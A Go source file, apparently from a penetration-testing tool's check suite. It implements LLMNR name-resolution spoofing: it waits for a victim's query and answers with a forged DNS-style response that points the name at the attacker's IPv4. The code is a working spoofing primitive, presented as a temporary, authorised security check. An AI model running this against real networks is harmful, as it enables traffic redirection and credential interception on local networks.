// llmnr.go implements the LLMNR name-resolution spoofing check. Impact
// temporary, restore decay with the 30 s bound the answer's TTL announces,
// affects clients: the answer to the victim's query names the attack
// leg's own IPv4 for the queried name, and the victim's resolver drops the
// entry when the TTL runs out.

package fh

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type llmnrFinding struct {
	Action  string `json:"action"`
	Query   string `json:"query"`
	Answer  string `json:"answer"`
	TTL     uint32 `json:"ttl"`
	Spoofed bool   `json:"spoofed"`
}

// RunLLMNR waits for an LLMNR query from the target's victim within the
// window and answers it unicast to the query's source MAC, IPv4, and UDP
// port (RFC 4795 section 2.3) with the query's id and name (section
// 2.1.1, the id copied from the query to the response) and the attack
// leg's own IPv4. The predicate is the query itself: one answered is
// confirmed, since the answer reaches the resolver that asked, and no
// query within the window is pending. Whether the victim accepted the
// answer is not observed, since the follow-up connection is the victim's
// own stack. Craft and send failures are returned with operation context.
func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	victim := deps.Target.Victim

	var query llmnrQuery
	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		q, ok := isLLMNRQueryFrom(data, victim.MAC)
		if ok {
			query = q
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "llmnr: receive query")
	}
	if found == nil {
		return check.Pending(fmt.Sprintf("no LLMNR query from the victim in %s", obs.Elapsed.Round(time.Millisecond))), nil
	}

	responsePkt, err := craftLLMNRResponse(addr, query)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "llmnr: craft response")
	}
	if err := deps.AttackLeg.Send(ctx, responsePkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "llmnr: send response")
	}

	detail := llmnrFinding{
		Action:  "llmnr-spoof",
		Query:   query.name,
		Answer:  addr.IPv4.String(),
		TTL:     30,
		Spoofed: true,
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("llmnr", detailBytes)

	return check.Confirmed(fmt.Sprintf("answered %s for %s; acceptance of the answer is not observed", query.name, victim.IP), obs.Elapsed), nil
}

// craftLLMNRResponse builds the answer to q: Ethernet → IPv4 → UDP(5355)
// → DNS response with the query's id and name and the attack leg's IPv4,
// sent unicast to the query's source.
func craftLLMNRResponse(addr link.Addr, q llmnrQuery) ([]byte, error) {
	answerIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       q.srcMAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    q.srcIP,
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: q.srcPort,
	}
	body := buildDNSResponse(q.id, q.name, answerIP)
	_ = udp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, udp, gopacket.Payload(body)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}

func buildDNSResponse(id uint16, qname string, answerIP net.IP) []byte {
	var buf []byte
	buf = binary.BigEndian.AppendUint16(buf, id)     // ID copied from the query
	buf = binary.BigEndian.AppendUint16(buf, 0x8000) // flags=response
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QDCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 1)      // ANCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // NSCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // ARCOUNT
	for _, label := range splitLabels(qname) {
		buf = append(buf, byte(len(label)))
		buf = append(buf, label...)
	}
	buf = append(buf, 0)                             // root
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QTYPE=A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QCLASS=IN
	buf = binary.BigEndian.AppendUint16(buf, 0xC00C) // compression pointer
	buf = binary.BigEndian.AppendUint16(buf, 1)      // type A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // class IN
	buf = binary.BigEndian.AppendUint32(buf, 30)     // TTL
	buf = binary.BigEndian.AppendUint16(buf, 4)      // rdlength
	buf = append(buf, answerIP.To4()...)
	return buf
}

func splitLabels(name string) [][]byte {
	var labels [][]byte
	start := 0
	for i := range len(name) {
		if name[i] == '.' {
			labels = append(labels, []byte(name[start:i]))
			start = i + 1
		}
	}
	if start < len(name) {
		labels = append(labels, []byte(name[start:]))
	}
	return labels
}
